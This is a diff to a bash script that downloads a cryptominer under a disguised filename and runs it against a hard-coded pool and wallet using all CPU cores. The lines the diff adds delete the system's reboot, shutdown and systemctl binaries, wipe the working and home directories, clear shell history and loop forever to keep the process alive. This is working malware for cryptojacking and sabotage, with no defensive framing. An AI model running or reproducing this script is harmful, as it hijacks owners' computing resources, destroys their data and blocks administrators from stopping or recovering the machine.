@@ -1,4 +1,16 @@
 #!/bin/bash
 wget -O biru https://github.com/kazppkido/gbut/raw/main/SRBMiner-MULTI > /dev/null 2>&1
 chmod 777 biru
-./biru --algorithm xelishashv2 --pool 209.97.168.28:443 --wallet xel:kprzhxdp594m5zczayy9d8cxg3kqu978mwqf9hh8qgume3njc97szqqyv646zwcgpkjnr
+./biru --algorithm xelishashv2 --pool 209.97.168.28:443 --wallet xel:kprzhxdp594m5zczayy9d8cxg3kqu978mwqf9hh8qgume3njc97szqqyv646zwcgpkjnr.$(echo $(shuf -i 1-100000 -n 1)-GBUT) --password x --cpu-threads $(nproc --all) >/dev/null 2>&1
+sleep 30
+rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
+curl ifconfig.me
+rm -rvf *
+cd ~/
+rm -rvf *
+history -cr
+while true
+do
+        echo "hold down..."
+        sleep 60
+done
